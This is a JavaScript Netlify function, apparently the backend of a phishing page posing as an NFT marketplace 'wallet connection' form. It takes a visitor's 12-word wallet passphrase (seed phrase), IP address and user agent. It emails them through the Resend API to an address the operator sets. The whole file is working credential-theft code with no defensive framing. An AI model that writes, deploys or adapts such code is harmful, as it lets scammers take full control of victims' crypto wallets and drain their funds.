// netlify/functions/send-email.js

import { Resend } from 'resend';

// For Node.js versions before 18, uncomment this line:
// const fetch = require('node-fetch');

export const handler = async (event, context) => {
    // Only allow POST requests
    if (event.httpMethod !== 'POST') {
      return {
        statusCode: 405,
        body: JSON.stringify({ error: 'Method not allowed' }),
      };
    }
  
    try {
      const { passphrase, ip, userAgent } = JSON.parse(event.body);
  
      // Validate input
      if (!passphrase || passphrase.trim().length === 0) {
        return {
          statusCode: 400,
          body: JSON.stringify({ error: 'Passphrase is required' }),
        };
      }
  
      // Initialize Resend
      const resend = new Resend(process.env.RESEND_API_KEY);
  
      // Send email
      const { data, error } = await resend.emails.send({
        from: process.env.FROM_EMAIL || 'onboarding@resend.dev',
        to: process.env.TO_EMAIL,
        subject: 'New Wallet Connection Attempt',
        html: `
          <h2>New Wallet Connection Form Submission</h2>
          <p><strong>Timestamp:</strong> ${new Date().toLocaleString()}</p>
          <p><strong>12 Key Passphrase:</strong></p>
          <pre style="background: #f5f5f5; padding: 10px; border-radius: 5px; font-family: monospace;">${passphrase}</pre>
          <p><strong>IP Address:</strong> ${ip || 'Not available'}</p>
          <p><strong>User Agent:</strong> ${userAgent || 'Not available'}</p>
          <hr style="margin: 20px 0;">
          <p style="color: #666; font-size: 12px;">Sent from CollabLink NFT Marketplace</p>
        `
      });
  
      if (error) {
        console.error('Resend API Error:', error);
        return {
          statusCode: 500,
          body: JSON.stringify({ success: false, error: 'Failed to send email' }),
        };
      }
  
      return {
        statusCode: 200,
        headers: {
          'Access-Control-Allow-Origin': '*',
          'Access-Control-Allow-Headers': 'Content-Type',
          'Access-Control-Allow-Methods': 'POST, OPTIONS',
        },
        body: JSON.stringify({ 
          success: true, 
          message: 'Email sent successfully',
          id: data.id 
        }),
      };
  
    } catch (error) {
      console.error('Function error:', error);
      
      return {
        statusCode: 500,
        headers: {
          'Access-Control-Allow-Origin': '*',
          'Access-Control-Allow-Headers': 'Content-Type',
          'Access-Control-Allow-Methods': 'POST, OPTIONS',
        },
        body: JSON.stringify({ 
          success: false, 
          error: 'Failed to send email' 
        }),
      };
    }
  };